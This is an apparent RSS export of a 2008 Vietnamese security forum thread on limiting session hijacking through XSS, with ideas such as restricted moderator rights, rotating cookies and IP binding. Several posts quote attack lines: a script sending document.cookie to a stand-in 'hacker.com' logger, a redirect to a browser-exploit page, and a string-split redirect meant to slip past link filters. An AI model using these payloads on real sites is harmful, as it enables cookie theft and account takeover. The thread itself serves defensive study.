				<description><![CDATA[ Tôi cũng có vài ý kiến bàn về tính khả thi dựa theo các phương pháp phòng ngừa tác hại do XSS gây ra cho diễn đàn nói riêng và website nói chung.

Nếu nhìn chung thì XSS thực sự nguy hiểm nhất là từ việc kẻ tấn công cướp hoặc giả mạo được phiên truy cập của các tài khoản cấp cao (từ VMod,Mod ) trở lên nên nhìn chung các cách của Bác Mai đưa ra phần nào cũng hạn chế được tác hại, tuy nhiên nếu xem kỹ về tính khả thi cũng như về tính tiện ích cho diễn đàn thì có phần bị hạn chế

Chẳng hạn:

<p></p>
		<cite class="blockquote">PXMMRF wrote:</cite><br>
		<blockquote> 
 
1-  <font color='yellow'>Hạn chế quyền của VMod và Mod, đặc biệt trong việc "xóa" bài</font>. Thí dụ chỉ cho phép Vmod hay Mod xóa nhiều nhất là 5 post trong một phiên kết nối và hoàn toàn không có quyền xóa toàn bộ một topic, cũng như chỉ cho phép "ban" hay "warning" tối đa 1 nick trong một phiên kết nối. (Thưc ra quyền hạn của Mod hay VMod trong HVA vốn cũng đã hạn chê).

&nbsp;
		</blockquote>

Vấn đề này thực ra không hạn chế được bao nhiêu vì nếu kẻ tấn công đã nắm rõ được phương thức tấn công thì cứ mỗi phiên cướp được họ sẽ ra tay và cứ thế. ngược lại cách này chúng ta phải can thiệp vào code khá nhiều. Nhưng hạn chế vẫn chưa cao.

<p></p>
		<cite class="blockquote">PXMMRF wrote:</cite><br>
		<blockquote> 

2- Khi chỉ xem forum, post bài, <font color='yellow'>các Admin. không nên truy cập vào HVA forum dứoi nickname- password của một Administrator, với quyền hạn như của một "root</font>", mà chỉ nên truy cập vào dưới nickname và password với quyền hạn như của một Mod. Còn khi config. lại Forum mới dùng quyền của Admin-root.

&nbsp;
		</blockquote>

Bàn về cách này của bác Mai ví dụ như kẻ tấn công đã có chủ ý và lỗi đó bị khai thác trong phần chữ ký chẳng hạn thì kẻ đó hoàn toàn có thể gởi một PM trực tiếp đến tài khoản có quyền quản trị cao nhất (chẳng hạn như quanlytruong) chẳng hạn thì khi (quanlytruong) đọc tin nhắn có kèm theo chữ ký thì hoàn toàn đã bị hacker cướp được. và lúc đó Hacker đang vẫn có thể khai thác với quyền tối cao.

<p></p>
		<cite class="blockquote">PXMMRF wrote:</cite><br>
		<blockquote> 
1- Áp dụng suy luận "ngoại phạm" hay "nôi phạm" gì đó của bên công an điều tra. Nghĩa là về nguyên tắc một user, tại một thời điểm xác định (theo Date và Time của Server) thì không thể cùng có mặt tại hai URL khác nhau. Ở đây có thể cải tiến tiện ích hiện hữu vốn rất hay của HVA forum là <font color='yellow'>"ai đang làm gì, ở đâu</font>" để phát hiện ra hacker.

&nbsp;
		</blockquote>

Cách này cũng là một biện pháp nhưng nó lại hạn chế tính năng của người truy cập, bởi vì giả sử người truy cập đang xem ở mục này vẫn có thể xem các bài viết ở mục khác đồng thời, và nếu ta hạn chế như thế sẽ gây cản trở cho họ.

<blockquote>
2- Cải tiến một tiện ích Monitoring user hay đựoc cài trên các Website, từ đó phát hiện ra một nickname nào đó <font color='yellow'>lại dùng các OS, trình duyệt... khác nhau</font> trong cùng một phiên kết nối. Từ đó phát hiện khả năng nickname này đang bị chiếm đoạt.
&nbsp;
		</blockquote>

Vấn đề này đúng là mọi người cũng đã và đang bàn tới.

Có ý kiến của bạn nào đó nói là khi Mod hoặc vMod thực hiện thao tác nào đó thì ta nên có môt mục để cho họ confirm lại pass một lần nữa theo tôi cách này xem ra không được tiện cho Mod hoặc Vmod nhưng độ an toàn là rất cao và dễ triển khai về phía server. Một ý kiến khá hay. Vì thực ra hacker chỉ chiếm được phiên truy cập dựa trên XSS nhưng hacker không hề biết được mật khẩu của Vmod và Mod thì xem ra cũng bó tay.

Ngoài ra có một phương thức như kiểu check IP download như của rapidshare (tức là IP xác định đó đi kèm tài khoản xác định chẳng hạn... Không biết có khả thi không? Như Với một tài khoản truy cập một thời điểm đi kèm với một Ip xác định ta chỉ thực hiện một thao tác (với rapidshare là download). Có thể Ip có thể trùng nhau nhưng cả Ip và Username trùng nhau cùng một thời điểm thì hơi bị hiếm hoặc giả cùng một username và khác Ip thì hoàn toàn là tài khoản đó đang bị tấn công. :D
Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116212</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116212</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 21:15:21]]> GMT</pubDate>
				<author><![CDATA[ ThíchHắcKinh]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Theo ngu ý của tôi thì admin nên deny tất cả những <b><i><font color='white'>link động</font></i></b> trên web app mà Users có thể tạo ra.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116238</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116238</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 23:28:04]]> GMT</pubDate>
				<author><![CDATA[ done]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Sự cố 'con gián' do mod gamma95 tìm ra ko liên quan gì đến link động.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116276</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116276</link>
				<pubDate><![CDATA[Sat, 23 Feb 2008 10:31:11]]> GMT</pubDate>
				<author><![CDATA[ lQ]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">lQ wrote:</cite><br>
		<blockquote>Sự cố 'con gián' do mod gamma95 tìm ra ko liên quan gì đến link động.&nbsp;
		</blockquote>
Oh, theo tôi nghĩ là có chứ nhỉ. Cái <b><i><font color='white'>link động</font></i></b> được che đậy sau cái ảnh trong một thẻ script.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116281</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116281</link>
				<pubDate><![CDATA[Sat, 23 Feb 2008 10:50:57]]> GMT</pubDate>
				<author><![CDATA[ done]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Hay lắm. Tiếp tục đi các bạn :).]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116288</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116288</link>
				<pubDate><![CDATA[Sat, 23 Feb 2008 11:41:36]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ <blockquote>Đối với XSS thì lọc đầu vào quan trọng hay lọc đầu ra quan trọng nhỉ ?&nbsp;
		</blockquote>
@gamma95: oki you re right!
Hồi trước mình làm bộ lọc là lọc chung cho SQL và XSS. Lúc đó cũng đã nhận ra một số bất cập trong việc xử lý XSS như gama đã nói.

@PMMM jj đó: Theo bồ không check đầu vào, đầu ra thì liệu có khắc phục triệt để XSS?
Cookie, HTTP header của bồ đều có  thể giả mạo.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116290</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116290</link>
				<pubDate><![CDATA[Sat, 23 Feb 2008 12:00:10]]> GMT</pubDate>
				<author><![CDATA[ Look2Me]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">done wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">lQ wrote:</cite><br>
		<blockquote>
<blockquote>Theo ngu ý của tôi thì admin nên deny tất cả những link động trên web app mà Users có thể tạo ra. &nbsp;
		</blockquote>
Sự cố 'con gián' do mod gamma95 tìm ra ko liên quan gì đến link động.&nbsp;
		</blockquote>
Oh, theo tôi nghĩ là có chứ nhỉ. Cái <b><i><font color='white'>link động</font></i></b> được che đậy sau cái ảnh trong một thẻ script.&nbsp;
		</blockquote>
hello done! nếu Attacker chèn như thế này thì liệu có bypass được cái <font color='orange'>lọc link động</font> của bạn ko??
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;script&gt;
var a='http://';
var b='www.';
var c='hacker';
var d='.net';
window.location=a+b+c+d;
&lt;/script&gt;</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116293</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116293</link>
				<pubDate><![CDATA[Sat, 23 Feb 2008 12:35:00]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ hí hí, chủ đề hay ghê, có lẽ phải đổi tên chút cho anh em bàn luận thoải mái về xss, chứ không chỉ ngăn chặn session hijacking á. Mà xem chừng có vẻ chưa có đc giải pháp nào triệt để với với vấn đề này rồi :(]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116304</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116304</link>
				<pubDate><![CDATA[Sat, 23 Feb 2008 13:41:34]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>hí hí, chủ đề hay ghê, có lẽ phải đổi tên chút cho anh em bàn luận thoải mái về xss, chứ không chỉ ngăn chặn session hijacking á. Mà xem chừng có vẻ chưa có đc giải pháp nào triệt để với với vấn đề này rồi :(&nbsp;
		</blockquote>

Đã nói về bảo mật thực sự không hề có cách gì gọi là triệt để cả vì không ai lường trước hết được tất cả các khả năng có thể xảy ra. Chúng ta chỉ xem xét các cách nào khả thi nhất và tính dễ triển khai nhất đồng thời có thể đáp ứng đủ nhu cầu của người dùng. Nhưng xét cho cùng khâu code vẫn là quan trọng nhất vì người có kinh nghiệm về bảo mật thì chú trọng ngay từ ở bước này có thể nói hạn chế rất nhiều các nguy cơ có thể xảy ra. Suy cho cùng kiểm tra tốt các dữ  liệu vào ra đã là một bước thành công lớn để bảo mật cho một ứng dụng.

Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116308</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116308</link>
				<pubDate><![CDATA[Sat, 23 Feb 2008 13:52:41]]> GMT</pubDate>
				<author><![CDATA[ ThíchHắcKinh]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>hí hí, chủ đề hay ghê, có lẽ phải đổi tên chút cho anh em bàn luận thoải mái về xss, chứ không chỉ ngăn chặn session hijacking á. Mà xem chừng có vẻ chưa có đc giải pháp nào triệt để với với vấn đề này rồi :(&nbsp;
		</blockquote>

Chủ đề này có ý giới hạn chỉ trong phần "session hijacking" và giả định xss vẫn còn thì phải làm thế nào để giảm thiểu dung hại chớ nó không có mục tiêu bàn cách khai thác hoặc khắc phục xss. Thật ra, khi thảo luận về các hướng có thể giảm thiểu dung hại của session hijacking, chúng ta có thể đi đến chiều sâu của giao thức (HTTP) và xác định được những điểm yếu, thiếu sót của giao thức hiện tại, nhìn ra những khả năng có thể (hoặc cần) khắc phục trong phiên bản tới của giao thức. Đây chính là hướng đào sâu một cách thấu đáo để khắc phục bảo mật (hoặc ngược lại, đào sâu một cách thấu đáo để tìm ra những yếu điểm thuộc nền tảng để khai thác).

Thân mến.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116333</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116333</link>
				<pubDate><![CDATA[Sat, 23 Feb 2008 18:04:23]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Look2Me wrote:</cite><br>
		<blockquote><blockquote>Đối với XSS thì lọc đầu vào quan trọng hay lọc đầu ra quan trọng nhỉ ?&nbsp;
		</blockquote>
@gamma95: oki you re right!
Hồi trước mình làm bộ lọc là lọc chung cho SQL và XSS. Lúc đó cũng đã nhận ra một số bất cập trong việc xử lý XSS như gama đã nói.

@PMMM jj đó: Theo bồ không check đầu vào, đầu ra thì liệu có khắc phục triệt để XSS?
Cookie, HTTP header của bồ đều có  thể giả mạo.&nbsp;
		</blockquote>
 
 Tôi đã nói là không filtering đầu vào đầu ra  cụ thể như thế nào đâu nhỉ?

 Những câu hỏi dẫn dắt của tôi là để đi đến một nhận định là:  Khi một web application, trong trừong hợp đang bàn là HVA forum và có thể kể cả Apache web server nữa, <font color='yellow'>đã mắc lỗi XSS rồi</font>, thì việc lọc đầu vào và đầu ra trên HVA forum-webserver không còn tác dụng cứu nạn nhân nữa. Nghĩa là lúc này không thể áp dụng việc lọc, thí dụ content filter chẳng hạn, <font color='yellow'>để cứu cho nạn nhân (tức là user đã xem hay nhấp một link trên một URL đã mắc lỗi XSS) rồi sẽ không bị hacker chiếm đoạt các thông tin cá nhân, trong đó có cookie nữa. Lọc lúc này thì đã muộn, vì một malicious script của lão gamma95 đã đựoc insert thành công vào signature rồi.</font>

 Tuy nhiên là tôi lại <b><font color='yellow'>rất coi trọng, tuyệt đối coi trọng là khác, yêu cầu lọc input và output của một webserver</font></b>, đặc biệt là input. Tất cả những đề nghị của tôi ở post trên, thí dụ không cho download các file hình ảnh đang hosting trên một webserver khác về HVA forum, hay không cho thiết lập các link kết nối ở các khu vực nhạy cảm của HVAforum để user đang xem forum có thể kết nối với một webserver bên ngoài..., <font color='yellow'>thì để thưc hiện điều đó phải Input content filtering, chứ còn gì nữa.</font> Nhưng trứoc hết phải phát hiện hết các lỗi XSS, khắc phục, rồi thưc hiện Filtering. Hoặc ngay bây giờ cũng nên áp dụng content filtering để ngăn các lỗi XSS mới hay lỗi cũ bị tái lạm dụng. Nhưng không chỉ cần lọc Input output, ngoài ra còn phải harden hệ thống - thí dụ encoded các HTML entries chẳng hạn...
 Nếu ta content filter tốt và config. tốt từ trước, thì gamma95 không thể insert vào vùng "signature " một con gián bò đi, lại ngộ nghĩnh, nhưng nó đã embedded  một malicious script...như vừa qua. (<i>gamma95 làm như vậy chỉ là check bảo mật, góp ý cho HVA, không có bất cứ ý đồ xấu nào)</i>

 Nhưng XSS là một vấn đề phức tạp, rối rắm. Nói thì dễ, nhưng làm thì khó. Rất khó phát hiện hết các lỗi XSS trên từng URL của HVA forum, vì HVA có gần trăm ngàn URL như vậy. Với XSS thì không có một "Patch" nào hết. Phải sửa tại chỗ và từng chỗ.
 
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116344</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116344</link>
				<pubDate><![CDATA[Sat, 23 Feb 2008 19:37:38]]> GMT</pubDate>
				<author><![CDATA[ PXMMRF]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Thanks bác PXM đã phân tích rất rõ ràng nhiều khía cạnh về cách phòng chống XSS. Nhân đây cháu cũng xin đưa ra ý kiến tham khảo là liệu xác thực dùng "HTTP authentication" có chống được XSS ko?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116411</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116411</link>
				<pubDate><![CDATA[Sun, 24 Feb 2008 02:02:27]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Có vẻ như HTTP authentication cũng ko thể chống đc XSS ...]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116423</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116423</link>
				<pubDate><![CDATA[Sun, 24 Feb 2008 04:07:18]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>Có vẻ như HTTP authentication cũng ko thể chống đc XSS ...&nbsp;
		</blockquote>
Ok, nhờ bạn boom_it phân tích thêm về nhận định này  :D ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116436</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116436</link>
				<pubDate><![CDATA[Sun, 24 Feb 2008 10:58:38]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <i>Chấp hành ý kiến của đồng chí "lãnh đạo" conmale, ta chỉ bàn về chủ đề đã được nêu ra. Tuy đôi chỗ có thể "lan man" chút đỉnh, nhưng cũng hướng về chủ đề trên. Mà ngay chỉ bàn về chủ đề này thôi, cũng có rất nhiều vấn đề hấp dẫn.</i>


<p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>@bác PXM:
cháu ví dụ:
HVA bị XSS và hacker chèn đoạn này vào chữ ký:
<font color='yellow'>&lt;script&gt; window.location="http://hacker.com/cookie.php?cookie="+document.cookie;&lt;/script&gt;</font>thì bản thân function "document.cookie" có chức năng đọc cookie của HVA, sau đó giá trị của cookie đóng vai trò là một @argument và gửi đến script đọc giá trị @argument đó và ghi vào file log.txt của hacker thôi. Còn câu hỏi của bác PMX là có chịu tổn thương gì ko thì theo cháu muốn trả lời được thì phải xem XSS ngoài chuyện lấy cookie ra thì có thể làm đc những gì? Ví dụ như Phishing, pharming, cài mã độc, hay dùng những 0-day exploit của browser etc ??&nbsp;
		</blockquote>

Lỗi trên HAV forum, tại phần signature, mà gamma95 khai thác thành công, tức là gamma95 đã vào được HVA dưới tên của nạn nhân (<i>môt số Mod. trong HVA</i>), là thuộc lỗi <b><font color='orange'>XSS Non-Persistent</font></b>. Trong đó ta thấy rõ ràng 3 thành phần: HVA forum (<font color='yellow'>1</font>), nạn nhân (<font color='yellow'>2</font>)- là ai đó đã từng nhấp chuột vào con gián chạy, đựoc insert vào signature của gamma85- và hacker-gamma95 (<font color='yellow'>3</font>), chủ nhân trang web<span class="link"> http://hacker.com</span> ở trên. Gamma95 chiếm đựoc quyển vào HVA forum của một phiên kết nối. Tuy nhiên vể tình tiết diễn biến  trong quá trình <font color='yellow'>exploiting scenarios </font>của gamma95 có khác đôi chút so với các scenarios của các quá trình khai thác lỗi Non-Persistent XSS điển hình khác. Nhưng nó cơ bản vẫn là quá trình khác thác một lỗi <b><font color='orange'>Non-Persistent XSS.</font></b>

 Với quá trình này gamma95 đã lấy đựoc cookie của nhiều nạn nhân. Những cookie này lưu trong trình duyệt nạn nhân (nằm trong các files liên quan tại Documents and Settings/Administrator/ ). Xin chú ý là hacker chỉ có thể lấy đựoc các thông tin cá nhân (trong đó có cookie) lưu trong trình duyệt của nạn nhân và những thông tin này phải là của phiên kết nối mà nạn nhân đang thưc hiện trên webserver (ở đây là HVA forum) có lỗi XSS và khi nạn nhân vẫn còn "đứng" trong webserver. Hacker không thể lấy đựoc các thông tin khác lưu trong trình duyệt, thí dụ cookie của báo Tuổi trẻ mà trước đó nạn nhân đã từng truy cập để xem. Nhưng về nguyên tắc là hacker có thể lấy đựoc mọi thông tin về phiên kết nối đến HVA forum, lưu trong trình duyệt nạn nhân. Gamma95 chỉ tạo một script lấy cookie. Vì theo gamma95 thế là đủ, thưc tế cũng như vậy.

   Trình duyệt của nạn nhân khi truy cập đến webserver của hacker (thành phần thứ 3) thì không bị webserver gây tổn thưong gì cả, nhưng nó chỉ cho phép môt malicious script mà hacker embedded trên URL của webserver, "chạy" (execute) trong nó và do đó script thu thập từ trình duyệt các thông tin cần thiết.
 Khi đọc các file độc hại trên webserver có lỗi XSS (thí dụ HVAforum) trình duyệt  có thể bị tổn thương. Nhưng cụ thể quá trình diễn ra chi tiết như thế nào thì khá phức tạp, khó hiểu và cũng không có tài liệu nào nói rõ. Cần ngâm cứu thêm. (<i>Ai biết rõ xin chỉ giáo</i>)

  Bây giờ xin đặt một câu hỏi có vẻ "hấp dẫn và quan trọng đây" với gamma95 và các bạn khác là: <font color='yellow'>Nếu bây giờ (<i>bây giờ là 10.30 AM, Feb.24, 2008</i>) nếu giả dụ HVA chưa khắc phục lỗi XSS tại "signature" trên forum, (<i>nghĩa là gamma95 vẫn có thể insert môt con "gián chay" vào khu signature của mình</i>), thì với cách khai thác đúng  như trên của gamma95, gamma95 có còn chiếm đựoc quyền phiên kết nối của môt nạn nhân hay không? Tại sao?</font>  ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116443</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116443</link>
				<pubDate><![CDATA[Sun, 24 Feb 2008 12:33:12]]> GMT</pubDate>
				<author><![CDATA[ PXMMRF]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>Có vẻ như HTTP authentication cũng ko thể chống đc XSS ...&nbsp;
		</blockquote>
Ok, nhờ bạn boom_it phân tích thêm về nhận định này  :D &nbsp;
		</blockquote>

Nói ra xấu hổ, chứ việc dùng xss để bypass HTTP authentication boom_jt cũng chưa nắm rõ á :"&gt; có điều nếu ai muốn nghiên cứu việc này thì boom_jt có tài liệu và video demo hẳn hoi đây:
link:<span class="link"> http://www.securiteam.com/tools/5TP0D0AM0M.html</span>
<blockquote>A Short Demonstration Video:<span class="link"> http://ferruh.mavituna.com/blogs/xsstunnelling-video.zip</span>

Video shows to exploit a permanent XSS in wordpress and bypass Basic Auth on the fly by XSS Tunnel.&nbsp;
		</blockquote>

@bác rxmmrf: 
<blockquote> Khi đọc các file độc hại trên webserver có lỗi XSS (thí dụ HVAforum) trình duyệt có thể bị tổn thương&nbsp;
		</blockquote>
có thể boom_jt hiểu thì sẽ là:
<blockquote>&lt;script&gt; window.location="http://hacker.com/khaithacloitrinhduyet.htm"&lt;/script&gt;&nbsp;
		</blockquote>
trong đó khaithacloitrinhduyet.htm là 1 file html đơn giản có chứa mã khai thác của 1 lỗi BOF nào đó hacker tìm thấy trên milw0rm chẳng hạn, khi đó máy tính victim sẽ thực thi đoạn shell code do hacker đặt trong file html trên -&gt; bị "tổn thương" (hì theo cách nói của bác ^^)

Nói thêm chút là có thể khai thác mà người dùng hoàn toàn ko nhận ra sự thay đổi bằng cách chèn 1 iframe với height=width=0 và src chính là trang html trên...

Về vấn đề khai thác xss tại thời điểm này, thì theo như bác gamma có nhận thấy sự xuất hiện của 1 biến combohash trong cookie do bác conmale đưa thêm vào, như vậy với cách khai thác là chỉ thay cookie thì chưa chắc đã thành công. File cookie.php của bác gamma sẽ phải có thêm chức năng lưu lại http header từ browser của victim gửi kèm, từ đó sử dụng http header này cùng với cookie thu được thì may ra sẽ thành công chăng :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116447</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116447</link>
				<pubDate><![CDATA[Sun, 24 Feb 2008 12:52:11]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>....

Về vấn đề khai thác xss tại thời điểm này, thì theo như bác gamma có nhận thấy sự xuất hiện của 1 biến combohash trong cookie do bác conmale đưa thêm vào, như vậy với cách khai thác là chỉ thay cookie thì chưa chắc đã thành công. File cookie.php của bác gamma sẽ phải có thêm chức năng lưu lại http header từ browser của victim gửi kèm, từ đó sử dụng http header này cùng với cookie thu được thì may ra sẽ thành công chăng :D&nbsp;
		</blockquote>

Đúng hướng rồi đó  :P . Tiếp tục khai triển đi bà con :).]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116455</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116455</link>
				<pubDate><![CDATA[Sun, 24 Feb 2008 14:08:38]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Khơi thêm một tí để bàn cho vui  :P 

Giả sử chúng ta có một trường hợp xử lý như sau:

1) User A gởi request <b>thứ nhất</b> đến HVA và chưa hề nhận được một cookie nào cả.

2) HVA trả lời request <b>thứ nhất</b> này đồng thời set một cookie "đặc biệt" trên trình duyệt của user A. Tạm gọi cookie này là <font color='orange'>cookie=1</font>

3) User A gởi request <b>thứ nhì</b> đến HVA, request này có kèm theo <font color='orange'>cookie=1</font>. Ở bước này HVA sẽ tiếp nhận request <b>thứ nhì</b> của user A nếu như nó có kèm theo <font color='orange'>cookie=1</font>. Nếu không, nó sẽ từ chối trả lời. Nếu HVA tiếp nhận request <b>thứ nhì</b> này (vì nó có kèm theo <font color='orange'>cookie=1</font>), HVA sẽ tiếp tục set một cookie khác đến trình duyệt của user A. Tạm gọi là <font color='green'>cookie=2</font> (cookie=1 đã bị hủy).

Cứ như thế, mỗi request từ user A phải kèm theo một cookie <b>mới nhất</b> và có giá trị được HVA set ở lần request <b>gần nhất trước đây</b> và request ấy chỉ được trả lời nếu như nó có cookie mới nhất và có giá trị.


Với cơ chế như trên, giả sử user B bằng cách nào đó "chôm" được cookie của user A (cứ cho rằng user B chôm được trọn bộ HTTP header của user A). Liệu user B có thể làm được gì với cookie lấy được? Tại sao? Tại sao không?

Mời bà con bàn.

Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118184</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118184</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 12:01:57]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote>
...đồng thời set một cookie "<font color='red'>đặc biệt</font>"...
&nbsp;
		</blockquote>
có thể giải thích chữ <font color='red'>đặc biệt</font> như thế nào nhỉ, là không phải một cookie bình thường chỉ chứa SID và các ttin thiết lập. là đang đề cập cụ thể cookie của HVA hiện tại? Hay là tính chất thay đổi liên tục vừa đc đưa ra?
<p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote>
Cứ như thế, mỗi request từ user A phải kèm theo một cookie <b>mới nhất</b> và có giá trị được HVA set ở lần request <b>gần nhất trước đây</b> và request ấy chỉ được trả lời nếu như nó có cookie mới nhất và có giá trị.
&nbsp;
		</blockquote>
Với cơ chế như trên, user B sẽ vào đc session bằng cookie lấy dc nếu nó còn là <font color='orange'>mới nhất</font>.
Lúc này, user A sẽ không thể duyệt tiếp vì cookie đang nắm đã out-of-date, nên sẽ cố đăng nhập lại -&gt; Session sẽ bị reset, B bị văng ra,....

Bên cạnh đó vấn đề nảy sinh là: 1 user bình thường mở đồng thời (trong 1 thời gian ngắn) 2 request đến HVA thì request sau sẽ vô dụng nếu request trước đã có respond. Để giải quyết điều này thì HVA có thể trả về cho request thứ 2 một thông báo tạm thời chờ đợi và wwwect lại trong vài giây để có cookie mới hợp lệ, hoặc là HVA cho phép xác nhận cookie trễ, bằng cách delay hiệu lực hóa cookie mới vài giây chẳng hạn.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118195</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118195</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 12:53:13]]> GMT</pubDate>
				<author><![CDATA[ vivashadow]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote>Khơi thêm một tí để bàn cho vui  :P 

Giả sử chúng ta có một trường hợp xử lý như sau:

1) User A gởi request <b>thứ nhất</b> đến HVA và chưa hề nhận được một cookie nào cả.

